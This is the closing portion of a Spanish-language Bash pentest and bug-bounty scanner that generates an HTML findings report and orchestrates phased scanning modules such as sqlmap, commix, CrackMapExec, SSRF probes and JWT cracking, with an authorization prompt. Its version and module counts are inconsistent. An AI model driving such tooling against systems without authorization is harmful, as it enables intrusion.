            local cvss_val; cvss_val=$(echo "$cvss" | grep -oE '^[0-9]+\.?[0-9]*' | head -1)
            if [[ -n "$cvss_val" ]]; then
                total_cvss=$(python3 -c "print(${total_cvss}+${cvss_val})" 2>/dev/null || echo "$total_cvss")
                ((cvss_count++)) || true
            fi
        fi

        # Resumen ejecutivo para hallazgos críticos/altos
        [[ "$severity" == "CRÍTICO" ]] && exec_critical+="<li><b>${title}</b> — CVSS: ${cvss}</li>"
        [[ "$severity" == "ALTO"    ]] && exec_high+="<li><b>${title}</b> — CVSS: ${cvss}</li>"
        [[ "$severity" == "MEDIO"   ]] && exec_medium+="<li>${title}</li>"

        local sev_class
        sev_class=$(echo "$severity" | tr '[:upper:]' '[:lower:]' | \
            sed 's/ítico/itico/g; s/é/e/g; s/ó/o/g; s/ /_/g')

        # Badge de CVSS con color
        local cvss_color="#5bc0de"
        if [[ "$cvss" =~ ^[0-9] ]]; then
            local cv_num; cv_num=$(echo "$cvss" | grep -oE '^[0-9]+' | head -1)
            (( cv_num >= 9  )) && cvss_color="#ff2d2d"
            (( cv_num >= 7 && cv_num < 9 )) && cvss_color="#ff6b35"
            (( cv_num >= 4 && cv_num < 7 )) && cvss_color="#ffd23f"
        fi

        findings_html+="<div class='finding finding-${sev_class}'>"
        findings_html+="<div class='finding-header'>"
        findings_html+="<span class='badge' style='background:${color};'>${severity}</span>"
        [[ -n "$cvss" && "$cvss" != "N/A" ]] && \
            findings_html+="<span class='cvss-badge' style='border-color:${cvss_color};color:${cvss_color};'>CVSS ${cvss}</span>"
        findings_html+="<span class='finding-title'>${title}</span>"
        findings_html+="</div>"
        findings_html+="<div class='finding-detail'>"
        findings_html+="${detail}"
        if [[ -n "$remediation" ]]; then
            findings_html+="<div class='remediation-box'>"
            findings_html+="<div class='remediation-title'>🔧 Cómo Corregir</div>"
            findings_html+="<div class='remediation-text'>${remediation}</div>"
            findings_html+="</div>"
        fi
        if [[ -n "$next_step" ]]; then
            findings_html+="<div class='nextstep-box'>"
            findings_html+="<div class='nextstep-title'>➡️ Siguiente Paso</div>"
            findings_html+="<div class='nextstep-text'><code>${next_step}</code></div>"
            findings_html+="</div>"
        fi
        findings_html+="</div></div>"
    done

    # CVSS promedio del scan
    local avg_cvss="N/A"
    if (( cvss_count > 0 )); then
        avg_cvss=$(python3 -c "print(round(${total_cvss}/${cvss_count},1))" 2>/dev/null || echo "N/A")
    fi

    # Resumen ejecutivo HTML
    local exec_html=""
    exec_html+="<div class='exec-summary'>"
    exec_html+="<h2 class='section-title'>📋 Resumen Ejecutivo (Para Dirección)</h2>"
    exec_html+="<div class='exec-intro'>"
    exec_html+="<p>Se realizó un análisis de seguridad sobre <b>${TARGET}</b> el <b>$(date '+%d/%m/%Y')</b>. "
    exec_html+="Se identificaron <b>${critical_count} hallazgos críticos</b>, <b>${high_count} altos</b>, "
    exec_html+="<b>${medium_count} medios</b> y <b>${low_count} bajos</b>.</p>"
    if [[ "$avg_cvss" != "N/A" ]]; then
        local risk_level="BAJO"
        local risk_color="#57cc99"
        (( $(echo "$avg_cvss >= 7" | bc -l 2>/dev/null || echo 0) )) && risk_level="ALTO" && risk_color="#ff6b35"
        (( $(echo "$avg_cvss >= 9" | bc -l 2>/dev/null || echo 0) )) && risk_level="CRÍTICO" && risk_color="#ff2d2d"
        (( $(echo "$avg_cvss >= 4 && $avg_cvss < 7" | bc -l 2>/dev/null || echo 0) )) && risk_level="MEDIO" && risk_color="#ffd23f"
        exec_html+="<p>El <b>nivel de riesgo global</b> del sistema es: <span style='color:${risk_color};font-weight:bold;font-size:16px;'>${risk_level} (CVSS promedio: ${avg_cvss})</span></p>"
    fi
    exec_html+="</div>"
    if [[ -n "$exec_critical" ]]; then
        exec_html+="<div class='exec-section exec-crit'><h3>🔴 Acción Inmediata Requerida</h3><ul>${exec_critical}</ul></div>"
    fi
    if [[ -n "$exec_high" ]]; then
        exec_html+="<div class='exec-section exec-high'><h3>🟠 Corregir en próximo Sprint</h3><ul>${exec_high}</ul></div>"
    fi
    if [[ -n "$exec_medium" ]]; then
        exec_html+="<div class='exec-section exec-med'><h3>🟡 Backlog de Seguridad</h3><ul>${exec_medium}</ul></div>"
    fi
    exec_html+="<div class='exec-note'><b>Nota:</b> Este reporte fue generado automáticamente con WriestTavo v3.0. "
    exec_html+="Los hallazgos deben ser validados manualmente antes de reportar en Bug Bounty o presentar a clientes.</div>"
    exec_html+="</div>"

    cat > "${REPORT_FILE}" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WriestTavo v3 Report</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6}
a{color:#58a6ff}
.header{background:linear-gradient(135deg,#0d1117 0%,#1a1f2e 50%,#0d1117 100%);padding:30px;border-bottom:3px solid #58a6ff}
.header h1{color:#58a6ff;font-size:26px;margin-bottom:4px;letter-spacing:1px}
.ver{color:#3fb950;font-size:11px;font-weight:bold;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px}
.header .meta{display:flex;gap:12px;margin-top:14px;flex-wrap:wrap}
.meta-item{background:#161b22;padding:7px 14px;border-radius:6px;border:1px solid #30363d;font-size:13px}
.meta-item span{color:#58a6ff;font-weight:600}
.container{max-width:1300px;margin:0 auto;padding:24px}
.section-title{font-size:19px;color:#58a6ff;margin:26px 0 14px;padding-bottom:8px;border-bottom:1px solid #30363d}
/* EXEC SUMMARY */
.exec-summary{background:#0d1117;border:1px solid #1f6feb;border-radius:10px;padding:22px;margin:18px 0}
.exec-intro{color:#c9d1d9;margin-bottom:14px;font-size:14px;line-height:1.8}
.exec-section{margin:10px 0;padding:12px 16px;border-radius:8px;border-left:4px solid}
.exec-crit{background:#1a0a0a;border-color:#ff2d2d}
.exec-high{background:#1a0f0a;border-color:#ff6b35}
.exec-med{background:#1a1600;border-color:#ffd23f}
.exec-section h3{font-size:13px;margin-bottom:7px}
.exec-section li{padding:3px 0;font-size:13px}
.exec-note{margin-top:14px;padding:10px 14px;background:#161b22;border-radius:6px;font-size:12px;color:#8b949e;border-left:3px solid #8b949e}
/* CARDS */
.summary{display:flex;gap:12px;margin:14px 0;flex-wrap:wrap}
.card{flex:1;min-width:105px;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;text-align:center}
.card .count{font-size:36px;font-weight:800}
.card .label{font-size:11px;color:#8b949e;margin-top:4px;text-transform:uppercase;letter-spacing:1px}
.card.critical{border-top:4px solid #ff2d2d}.card.critical .count{color:#ff2d2d}
.card.high{border-top:4px solid #ff6b35}.card.high .count{color:#ff6b35}
.card.medium{border-top:4px solid #ffd23f}.card.medium .count{color:#ffd23f}
.card.low{border-top:4px solid #57cc99}.card.low .count{color:#57cc99}
.card.info{border-top:4px solid #5bc0de}.card.info .count{color:#5bc0de}
.card.cvss-card{border-top:4px solid #a371f7}.card.cvss-card .count{color:#a371f7;font-size:26px}
/* INTEL */
.intel-box{background:#0d1117;border:1px solid #1f6feb;border-radius:8px;padding:14px 18px;margin:18px 0}
.intel-box h3{color:#3fb950;margin-bottom:10px;font-size:14px}
.intel-grid{display:flex;flex-wrap:wrap;gap:8px}
.intel-item{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:5px 11px;font-size:12px}
.intel-label{color:#8b949e;margin-right:5px}
.intel-val{color:#e6edf3;font-weight:600}
/* FINDINGS */
.finding{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:10px;overflow:hidden}
.finding-critictico{border-left:4px solid #ff2d2d}
.finding-alto{border-left:4px solid #ff6b35}
.finding-medio{border-left:4px solid #ffd23f}
.finding-bajo{border-left:4px solid #57cc99}
.finding-info{border-left:4px solid #5bc0de}
.finding-header{display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;user-select:none}
.finding-header:hover{background:#1f2937}
.badge{padding:3px 9px;border-radius:4px;font-size:11px;font-weight:800;color:#000;min-width:66px;text-align:center}
.cvss-badge{padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;background:transparent;border:1px solid;min-width:76px;text-align:center}
.finding-title{font-weight:600;font-size:14px;color:#e6edf3;flex:1}
.finding-detail{padding:14px 16px;background:#0d1117;border-top:1px solid #30363d;font-size:13px;display:none}
.finding.open .finding-detail{display:block}
/* REMEDIATION */
.remediation-box{margin-top:12px;padding:12px 14px;background:#0a1628;border:1px solid #1f6feb;border-radius:6px}
.remediation-title{color:#58a6ff;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
.remediation-text{color:#c9d1d9;font-size:13px;line-height:1.7}
.nextstep-box{margin-top:8px;padding:12px 14px;background:#0a2010;border:1px solid #3fb950;border-radius:6px}
.nextstep-title{color:#3fb950;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
.nextstep-text code{color:#7ee787;font-size:12px;font-family:'Consolas',monospace;background:#161b22;padding:3px 7px;border-radius:4px;display:block;white-space:pre-wrap;word-break:break-all}
pre{background:#161b22;padding:10px;border-radius:4px;overflow-x:auto;font-size:12px;color:#7ee787;white-space:pre-wrap}
code{color:#7ee787;font-family:'Consolas',monospace}
.vuln-table{width:100%;border-collapse:collapse;font-size:12px;margin-top:10px}
.vuln-table th{background:#21262d;color:#8b949e;padding:8px 10px;text-align:left;border:1px solid #30363d}
.vuln-table td{padding:7px 10px;border:1px solid #21262d;vertical-align:top;word-break:break-all}
.vuln-table tr:hover td{background:#161b22}
td.critical,td.critico{color:#ff2d2d;font-weight:bold}
td.high,td.alto{color:#ff6b35;font-weight:bold}
td.medium,td.medio{color:#ffd23f;font-weight:bold}
td.vuln{color:#ff6b35;font-weight:bold}
.files-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:8px;margin-top:10px}
.file-item{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:8px 12px;font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.footer{text-align:center;padding:22px;color:#484f58;font-size:12px;margin-top:38px;border-top:1px solid #21262d}
.filter-bar{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0}
.filter-btn{padding:5px 14px;border-radius:20px;border:1px solid #30363d;background:#161b22;color:#8b949e;cursor:pointer;font-size:12px;transition:all .2s}
.filter-btn:hover,.filter-btn.active{background:#58a6ff;color:#000;border-color:#58a6ff;font-weight:700}
</style>
</head>
<body>
HTMLEOF

    cat >> "${REPORT_FILE}" << DYNEOF
<div class="header">
  <div class="container">
    <div class="ver">▸ WriestTavo v3.0 — Bug Bounty &amp; Pentest Scanner ◂</div>
    <h1>⚡ Security Report :: ${TARGET}</h1>
    <div class="meta">
      <div class="meta-item">Target: <span>${TARGET}</span></div>
      <div class="meta-item">Fecha: <span>$(date '+%d/%m/%Y %H:%M')</span></div>
      <div class="meta-item">Modo: <span>${SCAN_MODE}</span></div>
      <div class="meta-item">CVSS Promedio: <span>${avg_cvss}</span></div>
    </div>
  </div>
</div>
<div class="container">
  ${intel_summary_html}
  ${exec_html}
  <h2 class="section-title">📊 Dashboard</h2>
  <div class="summary">
    <div class="card critical"><div class="count">${critical_count}</div><div class="label">Crítico</div></div>
    <div class="card high">    <div class="count">${high_count}</div>    <div class="label">Alto</div></div>
    <div class="card medium">  <div class="count">${medium_count}</div>  <div class="label">Medio</div></div>
    <div class="card low">     <div class="count">${low_count}</div>     <div class="label">Bajo</div></div>
    <div class="card info">    <div class="count">${info_count}</div>    <div class="label">Info</div></div>
    <div class="card cvss-card"><div class="count">${avg_cvss}</div><div class="label">CVSS Prom.</div></div>
  </div>
  <h2 class="section-title">🔍 Hallazgos Detallados</h2>
  <div class="filter-bar">
    <button class="filter-btn active" onclick="filterF('all',this)">Todos</button>
    <button class="filter-btn" style="color:#ff2d2d" onclick="filterF('critictico',this)">🔴 Crítico</button>
    <button class="filter-btn" style="color:#ff6b35" onclick="filterF('alto',this)">🟠 Alto</button>
    <button class="filter-btn" style="color:#ffd23f" onclick="filterF('medio',this)">🟡 Medio</button>
    <button class="filter-btn" style="color:#57cc99" onclick="filterF('bajo',this)">🟢 Bajo</button>
    <button class="filter-btn" style="color:#5bc0de" onclick="filterF('info',this)">ℹ Info</button>
    <button class="filter-btn" onclick="document.querySelectorAll('.finding').forEach(f=>f.classList.add('open'))">➕ Abrir todo</button>
    <button class="filter-btn" onclick="document.querySelectorAll('.finding').forEach(f=>f.classList.remove('open'))">➖ Cerrar todo</button>
  </div>
  <div id="fc">${findings_html}</div>
  <h2 class="section-title">📁 Archivos Generados</h2>
  <div class="files-grid">
DYNEOF

    find "${OUTPUT_DIR}" -type f ! -name "*.html" 2>/dev/null | sort | while read -r f; do
        echo "    <div class='file-item'><a href='${f}'>${f}</a></div>"
    done >> "${REPORT_FILE}"

    cat >> "${REPORT_FILE}" << 'FOOTEOF'
  </div>
  <div class="footer">
    <b style="color:#58a6ff">WriestTavo v3.0</b> by WRIΞSTTAV0 &nbsp;|&nbsp;
    29 módulos &nbsp;|&nbsp; Solo con autorización explícita
  </div>
</div>
<script>
document.querySelectorAll('.finding-header').forEach(h=>{
  h.addEventListener('click',()=>h.parentElement.classList.toggle('open'));
});
document.querySelectorAll('.finding-critictico,.finding-alto').forEach(f=>f.classList.add('open'));
function filterF(sev,btn){
  document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.querySelectorAll('.finding').forEach(f=>{
    f.style.display=(sev==='all'||f.classList.contains('finding-'+sev))?'block':'none';
  });
}
</script>
</body>
</html>
FOOTEOF

    ok "Reporte v3 generado: ${REPORT_FILE}"
}

# ─── MENÚ INTERACTIVO ───────────────────────────────────────────
menu_modulos() {
    echo -e "${C_BLU}╔══════════════════════════════════════╗${C_RST}"
    echo -e "${C_BLU}║     Selecciona módulos a ejecutar    ║${C_RST}"
    echo -e "${C_BLU}╚══════════════════════════════════════╝${C_RST}"
    echo
    echo -e "  ${C_GRN}[1]${C_RST} Full Scan v4.0 ${C_YEL}(41 módulos — stack moderno completo)${C_RST}"
    echo -e "  ${C_GRN}[2]${C_RST} Recon OSINT  ${C_CYN}(crt.sh + theHarvester + dnsrecon + subdominios)${C_RST}"
    echo -e "  ${C_GRN}[3]${C_RST} Web + SSL     ${C_CYN}(WAF + nikto + nuclei + gobuster + sslscan + arjun)${C_RST}"
    echo -e "  ${C_GRN}[4]${C_RST} Bug Bounty Pro${C_CYN}(recon + framework + injection + CORS + JWT + SSRF)${C_RST}"
    echo -e "  ${C_GRN}[5]${C_RST} Injection Suite${C_CYN}(SQLi + NoSQLi + XSS + LFI + SSTI + SSRF + CORS + CMDi)${C_RST}"
    echo -e "  ${C_GRN}[6]${C_RST} API Modern    ${C_CYN}(endpoints + GraphQL + Swagger + arjun + JWT + CORS)${C_RST}"
    echo -e "  ${C_GRN}[7]${C_RST} Windows/Infra ${C_CYN}(IIS + NTLM + RDP + SMB + Docker + K8s + SNMP)${C_RST}"
    echo -e "  ${C_GRN}[8]${C_RST} Framework Deep${C_CYN}(whatweb + framework_scan + SSTI + SSRF + rutas críticas)${C_RST}"
    echo -e "  ${C_GRN}[9]${C_RST} WordPress     ${C_CYN}(wpscan + nuclei + gobuster + SQLi + XSS)${C_RST}"
    echo -e "  ${C_GRN}[10]${C_RST} CTF/HTB Mode ${C_CYN}(todos los módulos en modo agresivo)${C_RST}"
    echo -e "  ${C_GRN}[11]${C_RST} Custom        ${C_CYN}(elegir módulos 1-38)${C_RST}"
    echo
    echo -ne "${C_YEL}Opción [1-11]: ${C_RST}"
    read -r opcion

    case "$opcion" in
        1)  run_full_scan ;;
        2)  modulo_crtsh; modulo_theharvester; modulo_dnsrecon; modulo_subdominios ;;
        3)  modulo_waf; modulo_http_headers; modulo_whatweb; modulo_sslscan; modulo_nikto; modulo_nuclei; modulo_gobuster; modulo_arjun ;;
        4)  modulo_ttl_os; modulo_port_scan; modulo_version_scan
            modulo_crtsh; modulo_theharvester; modulo_dnsrecon; modulo_subdominios
            modulo_waf; modulo_http_headers; modulo_whatweb; modulo_sslscan
            modulo_framework_scan; modulo_nuclei; modulo_gobuster; modulo_arjun
            modulo_endpoints; modulo_js_analysis; modulo_jwt
            modulo_sqli; modulo_xss; modulo_dalfox; modulo_lfi; modulo_ssrf; modulo_cors; modulo_xxe; modulo_idor_redirect ;;
        5)  modulo_arjun; modulo_sqli; modulo_sqlmap; modulo_nosqli
            modulo_xss; modulo_dalfox; modulo_commix; modulo_lfi; modulo_ssti; modulo_ssrf; modulo_cors ;;
        6)  modulo_waf; modulo_http_headers; modulo_whatweb; modulo_framework_scan
            modulo_endpoints; modulo_js_analysis; modulo_arjun; modulo_jwt; modulo_cors ;;
        7)  modulo_port_scan; modulo_version_scan; modulo_smb; modulo_cme; modulo_snmp
            modulo_smtp_enum; modulo_http_methods; modulo_infra_exposure; modulo_iis_windows ;;
        8)  modulo_whatweb; modulo_framework_scan; modulo_ssti; modulo_ssrf; modulo_lfi ;;
        9)  modulo_waf; modulo_http_headers; modulo_wpscan; modulo_nuclei; modulo_gobuster
            modulo_sqli; modulo_xss; modulo_dalfox ;;
        10) SCAN_MODE="aggressive"
            modulo_port_scan; modulo_version_scan; modulo_waf; modulo_whatweb
            modulo_framework_scan; modulo_nuclei; modulo_gobuster; modulo_arjun
            modulo_sqli; modulo_sqlmap; modulo_nosqli; modulo_xss; modulo_dalfox
            modulo_commix; modulo_lfi; modulo_ssti; modulo_ssrf; modulo_cors
            modulo_jwt; modulo_http_methods; modulo_infra_exposure
            modulo_smb; modulo_cme; modulo_vuln_scan; modulo_searchsploit ;;
        11) menu_custom ;;
        *)  warn "Opción inválida. Ejecutando Full Scan."; run_full_scan ;;
    esac
}

menu_custom() {
    echo
    echo -e "${C_YEL}Módulos v4.0 (38) — escribe números separados por espacio:${C_RST}"
    echo -e "  ${C_GRN} 1${C_RST}) TTL/OS          ${C_GRN} 2${C_RST}) Port Scan       ${C_GRN} 3${C_RST}) Version Scan"
    echo -e "  ${C_GRN} 4${C_RST}) WAF              ${C_GRN} 5${C_RST}) HTTP Headers    ${C_GRN} 6${C_RST}) WhatWeb"
    echo -e "  ${C_GRN} 7${C_RST}) Nikto            ${C_GRN} 8${C_RST}) Gobuster        ${C_GRN} 9${C_RST}) Subdominios"
    echo -e "  ${C_GRN}10${C_RST}) SMB              ${C_GRN}11${C_RST}) Vuln Scan       ${C_GRN}12${C_RST}) Searchsploit"
    echo -e "  ${C_GRN}13${C_RST}) SQLi básico      ${C_GRN}14${C_RST}) XSS básico      ${C_GRN}15${C_RST}) Endpoints/API"
    echo -e "  ${C_GRN}16${C_RST}) JS Analysis      ${C_GRN}17${C_RST}) theHarvester    ${C_GRN}18${C_RST}) dnsrecon"
    echo -e "  ${C_GRN}19${C_RST}) SSLScan          ${C_GRN}20${C_RST}) Nuclei          ${C_GRN}21${C_RST}) sqlmap"
    echo -e "  ${C_GRN}22${C_RST}) Dalfox (XSS)     ${C_GRN}23${C_RST}) Commix (CMDi)   ${C_GRN}24${C_RST}) Arjun"
    echo -e "  ${C_GRN}25${C_RST}) WPScan           ${C_GRN}26${C_RST}) crt.sh          ${C_GRN}27${C_RST}) SMTP Enum"
    echo -e "  ${C_GRN}28${C_RST}) SNMP             ${C_GRN}29${C_RST}) CrackMapExec    ${C_GRN}30${C_RST}) Framework Scan"
    echo -e "  ${C_GRN}31${C_RST}) LFI/Path Trav    ${C_GRN}32${C_RST}) SSRF            ${C_GRN}33${C_RST}) SSTI"
    echo -e "  ${C_GRN}34${C_RST}) CORS Misconfig   ${C_GRN}35${C_RST}) JWT Analysis    ${C_GRN}36${C_RST}) NoSQLi"
    echo -e "  ${C_GRN}37${C_RST}) HTTP Methods     ${C_GRN}38${C_RST}) Docker/K8s/Infra"
    echo -e "  ${C_GRN}39${C_RST}) XXE              ${C_GRN}40${C_RST}) IDOR+OpenRedirect  ${C_GRN}41${C_RST}) IIS Windows"
    echo
    echo -ne "${C_YEL}Selección: ${C_RST}"
    read -r seleccion

    for num in $seleccion; do
        case "$num" in
            1)  modulo_ttl_os ;;        2)  modulo_port_scan ;;     3)  modulo_version_scan ;;
            4)  modulo_waf ;;           5)  modulo_http_headers ;;  6)  modulo_whatweb ;;
            7)  modulo_nikto ;;         8)  modulo_gobuster ;;      9)  modulo_subdominios ;;
            10) modulo_smb ;;           11) modulo_vuln_scan ;;     12) modulo_searchsploit ;;
            13) modulo_sqli ;;          14) modulo_xss ;;           15) modulo_endpoints ;;
            16) modulo_js_analysis ;;   17) modulo_theharvester ;;  18) modulo_dnsrecon ;;
            19) modulo_sslscan ;;       20) modulo_nuclei ;;        21) modulo_sqlmap ;;
            22) modulo_dalfox ;;        23) modulo_commix ;;        24) modulo_arjun ;;
            25) modulo_wpscan ;;        26) modulo_crtsh ;;         27) modulo_smtp_enum ;;
            28) modulo_snmp ;;          29) modulo_cme ;;           30) modulo_framework_scan ;;
            31) modulo_lfi ;;           32) modulo_ssrf ;;          33) modulo_ssti ;;
            34) modulo_cors ;;          35) modulo_jwt ;;           36) modulo_nosqli ;;
            37) modulo_http_methods ;;  38) modulo_infra_exposure ;;
            39) modulo_xxe ;;           40) modulo_idor_redirect ;;  41) modulo_iis_windows ;;
        esac
    done
}

run_full_scan() {
    log "════════════════════════════════════════"
    log " WriestTavo v4.0 — Full Scan (41 módulos)"
    log "════════════════════════════════════════"

    # ── FASE 1: Reconocimiento pasivo (sin tocar el target)
    log "── FASE 1: Reconocimiento Pasivo ──────"
    modulo_crtsh
    modulo_theharvester
    modulo_dnsrecon

    # ── FASE 2: Descubrimiento de infraestructura
    log "── FASE 2: Infraestructura ─────────────"
    modulo_ttl_os
    modulo_port_scan
    modulo_version_scan
    modulo_infra_exposure     # Docker/K8s/Prometheus antes de web

    # ── FASE 3: Servicios de red no-web
    log "── FASE 3: Servicios de Red ────────────"
    modulo_smb
    modulo_cme
    modulo_snmp
    modulo_smtp_enum
    modulo_subdominios

    # ── FASE 4: Fingerprinting web (alimenta INTEL para fases 5-7)
    log "── FASE 4: Fingerprinting Web ──────────"
    modulo_waf                # INTEL_WAF_DETECTED → ajusta delay en todos
    modulo_http_headers
    modulo_sslscan
    modulo_whatweb            # INTEL_FRAMEWORK_* → activa rutas específicas
    modulo_wpscan             # Solo si INTEL_CMS=wordpress
    modulo_nikto

    # ── FASE 5: Escaneo profundo (usa INTEL de fase 4)
    log "── FASE 5: Escaneo Profundo ────────────"
    modulo_nuclei             # Usa INTEL_CMS, INTEL_WAF
    modulo_framework_scan     # Usa INTEL_FRAMEWORK_* para rutas críticas
    modulo_gobuster           # Usa INTEL_WORDLIST_EXTRA según CMS/tech
    modulo_arjun              # Descubre parámetros → alimenta fase 6
    modulo_endpoints          # GraphQL, Swagger, API discovery
    modulo_js_analysis        # Secretos, JWTs, endpoints en bundles

    # ── FASE 6: Vulnerabilidades web (usa todo el INTEL acumulado)
    log "── FASE 6: Vulnerabilidades Web ────────"
    modulo_sqli               # Usa INTEL_INJECTABLE_URLS, INTEL_TECHNOLOGIES
    modulo_sqlmap             # Solo si INTEL_SQLI_FOUND=true
    modulo_nosqli             # Solo si mongodb/nosql en INTEL_TECHNOLOGIES
    modulo_xss                # Usa INTEL_INJECTABLE_URLS
    modulo_dalfox             # Confirma XSS con más contexto
    modulo_commix             # Command injection en mismas URLs
    modulo_lfi                # Path traversal → escala auto si encuentra
    modulo_ssrf               # Prueba cloud metadata automáticamente
    modulo_ssti               # Solo si framework con template engine
    modulo_cors               # Genera PoC automático si encuentra vuln
    modulo_jwt                # Busca JWTs en JS/headers y los crackea
    modulo_xxe                # XML injection en APIs Java/.NET/PHP
    modulo_idor_redirect      # IDOR + Open Redirect
    modulo_iis_windows        # Solo si Windows/IIS detectado
    modulo_http_methods       # PUT/TRACE/IIS específico

    # ── FASE 7: Post-scan y reporting
    log "── FASE 7: Post-Scan ───────────────────"
    modulo_vuln_scan
    modulo_searchsploit
}

# ─── HELP ───────────────────────────────────────────────────────
show_help() {
    echo
    echo -e "${C_BOLD}WriestTavo v4.0${C_RST} :: Pentesting & Bug Bounty Scanner (41 módulos)"
    echo
    echo -e "Uso: sudo $0 [opciones] <IP | dominio>"
    echo
    echo -e "Opciones:"
    echo -e "  -m, --mode    Modo de escaneo: ${C_YEL}normal${C_RST} | ${C_YEL}stealth${C_RST} | ${C_YEL}aggressive${C_RST}"
    echo -e "  -o, --output  Directorio de salida (default: wriestTavo_results)"
    echo -e "  -h, --help    Mostrar esta ayuda"
    echo
    echo -e "Ejemplos:"
    echo -e "  ${C_CYN}sudo $0 192.168.1.1${C_RST}"
    echo -e "  ${C_CYN}sudo $0 --mode stealth 10.10.10.5${C_RST}"
    echo -e "  ${C_CYN}sudo $0 --mode aggressive -o /tmp/scan hackerone.com${C_RST}"
    echo
    echo -e "${C_YEL}⚠ AVISO LEGAL: Solo usar en sistemas con autorización explícita.${C_RST}"
    echo
}

# ─── MAIN ───────────────────────────────────────────────────────
main() {
    # Parsear argumentos
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -m|--mode)   SCAN_MODE="$2"; shift 2 ;;
            -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
            -h|--help)   show_help; exit 0 ;;
            -*)          err "Opción desconocida: $1"; show_help; exit 1 ;;
            *)           TARGET="$1"; shift ;;
        esac
    done

    [[ -z "$TARGET" ]] && show_help && exit 1

    # ── Normalizar TARGET: aceptar URLs completas o IPs/hostnames ──
    ORIGINAL_URL=""
    if [[ "$TARGET" =~ ^https?:// ]]; then
        # Guardar URL original para módulos web
        ORIGINAL_URL="${TARGET%/}"
        # Extraer solo el hostname (sin protocolo, sin path, sin puerto)
        TARGET=$(echo "$TARGET" | sed -E 's|^https?://||; s|/.*||; s|:[0-9]+$||')
        ok "URL normalizada: ${C_YEL}${ORIGINAL_URL}${C_RST} → hostname: ${C_YEL}${TARGET}${C_RST}"
    fi

    check_root
    check_deps
    preparar_directorio
    show_banner

    echo -e "${C_YEL}⚠  AVISO LEGAL: Este script debe usarse SOLO en sistemas"
    echo -e "   con autorización explícita del propietario.${C_RST}"
    echo -ne "  ${C_GRN}Confirmo que tengo autorización [s/N]: ${C_RST}"
    read -r confirm
    [[ ! "${confirm,,}" =~ ^(s|si|yes|y|1)$ ]] && { warn "Abortado."; exit 1; }
    echo

    menu_modulos

    generar_reporte_html

    echo
    echo -e "${C_BLU}════════════════════════════════════════════${C_RST}"
    echo -e "  ${C_GRN}SCAN COMPLETO${C_RST}"
    echo -e "  Reporte: ${C_YEL}${REPORT_FILE}${C_RST}"
    echo -e "  Archivos: ${C_YEL}${OUTPUT_DIR}/${C_RST}"
    echo -e "${C_BLU}════════════════════════════════════════════${C_RST}"
}

main "$@"
